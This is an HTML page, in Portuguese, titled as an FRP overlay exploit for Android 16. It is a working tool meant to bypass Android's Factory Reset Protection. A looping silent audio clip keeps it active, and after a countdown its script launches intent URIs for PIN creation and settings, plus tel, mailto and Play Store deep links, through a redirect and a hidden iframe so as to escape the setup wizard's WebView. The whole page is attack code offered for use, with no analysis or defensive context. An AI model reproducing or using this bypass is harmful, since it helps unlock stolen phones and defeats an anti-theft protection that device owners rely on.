<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FRP Overlay Exploit (Android 16) - V2</title>
    <style>
        body { font-family: -apple-system, sans-serif; padding: 20px; background-color: #121212; color: #ffffff; }
        .btn { display: block; width: 100%; padding: 12px; margin: 8px 0; background: #007bff; color: white; border: none; border-radius: 8px; font-size: 15px; font-weight: bold; }
        .btn-danger { background: #dc3545; }
        .btn-warning { background: #ffc107; color: #000; }
        .btn-success { background: #28a745; }
        #status { margin-top: 20px; font-weight: bold; color: #ffc107; text-align: center; }
        h2 { font-size: 20px; margin-bottom: 5px; }
        p { font-size: 13px; color: #ccc; margin-bottom: 20px; }
    </style>
</head>
<body>
    <h2>🚀 Bypass via Deep Links</h2>
    <p>O WebView bloqueia "intent://". Vamos usar esquemas universais (tel, mailto, web).</p>

    <audio id="wakelock" loop>
        <source src="data:audio/wav;base64,UklGRigAAABXQVZFZm10IBIAAAABAAEARKwAAIhYAQACABAAAABkYXRhAgAAAAEA" type="audio/wav">
    </audio>

    <!-- NOVAS ROTAS (Fuga de WebView) -->
    <button class="btn btn-success" onclick="iniciarBomba('tel:112')">
        1. Forçar Discador (Esquema 'tel:')
    </button>

    <button class="btn btn-warning" onclick="iniciarBomba('mailto:admin@google.com')">
        2. Forçar Gmail (Esquema 'mailto:')
    </button>

    <button class="btn" onclick="iniciarBomba('https://play.google.com/store/apps/details?id=com.android.settings')">
        3. Forçar Play Store (Deep Link)
    </button>

    <!-- Rota de PIN com formatação alternativa (Tenta escapar via iframe) -->
    <button class="btn btn-danger" onclick="iniciarBomba('intent:#Intent;action=android.app.action.SET_NEW_PASSWORD;category=android.intent.category.DEFAULT;end')">
        4. Criação de PIN (Modo Iframe)
    </button>
    
    <button class="btn" onclick="iniciarBomba('intent:#Intent;action=android.settings.SETTINGS;end')">
        5. Configurações (Modo Iframe)
    </button>

    <div id="status">Aguardando comando...</div>

    <script>
        function iniciarBomba(intentUri) {
            let audio = document.getElementById('wakelock');
            audio.play().catch(e => console.log("Audio play blocker", e));

            let tempoAlvo = Date.now() + 10000; 
            const statusDiv = document.getElementById('status');
            
            const intervalo = setInterval(() => {
                let tempoRestante = Math.ceil((tempoAlvo - Date.now()) / 1000);

                if (tempoRestante > 0) {
                    statusDiv.innerHTML = `⚠️ VOLTE PARA O SETUP WIZARD AGORA!<br>Injetando tela em: ${tempoRestante}s`;
                } else {
                    clearInterval(intervalo);
                    statusDiv.innerHTML = "💥 INJETANDO CÓDIGO...";
                    
                    // MÉTODO 1: Redirecionamento Direto
                    window.location.href = intentUri;
                    
                    // MÉTODO 2: Injeção via Iframe Oculto (Bypassa algumas proteções do WebView)
                    setTimeout(() => {
                        let iframe = document.createElement('iframe');
                        iframe.style.display = 'none';
                        iframe.src = intentUri;
                        document.body.appendChild(iframe);
                    }, 500);

                    audio.pause();
                }
            }, 200);
        }
    </script>
</body>
</html>
